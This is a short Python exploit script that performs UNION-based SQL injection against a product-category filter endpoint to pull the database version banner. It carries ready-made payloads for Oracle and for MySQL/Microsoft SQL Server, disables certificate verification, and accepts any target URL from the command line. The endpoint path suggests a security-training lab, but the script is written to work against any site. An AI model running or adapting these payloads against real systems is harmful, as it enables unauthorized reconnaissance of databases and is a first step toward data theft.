import requests
import sys
from bs4 import BeautifulSoup
import re
import urllib3
# Suppresses "certificate verification is strongly advised" warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def  db_info(url,db_type):
    if url[len(url)-1] == "/":
        url=url[:-1]

    path = '/filter?category=Corporate+gifts'

    if db_type=="Oracle":
            print("[~] Oracle DB selected")
            regex = ".*(.+[\d+'.']{4}\d.+).*"
            
            sql_payload = "'UNION+SELECT+BANNER,NULL+FROM+v$version--"
            
    elif db_type=="Microsoft" or db_type=="MySQL":
            print("[~] Microsoft or MySQL DB selected")
            regex = ".*(.+[\d+'.']{2}\d.+).*"

            #%23 = #.   Comments for these are # not --
            sql_payload = "'UNION+SELECT+NULL,@@version%23"
            

    if sql_payload:
        r = requests.get(url + path + sql_payload, verify=False)

        soup = BeautifulSoup(r.text, 'html.parser')

        # Regex to grab every entry that looks like a version number.
        results = soup.find_all(text=re.compile(regex))

        if results:  
            for r in results:
                print("[+] - '%s'" % r)
        else:
            print("[!] No results found")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        db_type = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage : %s <url> <DB>" % sys.argv[0])
        print("[-] Example: %s www.example.com <Oracle>" % sys.argv[0])
        sys.exit(-1)
    
    print("[~] Attempting to use SQL injection to get DB info")

    db_info(url,db_type)

    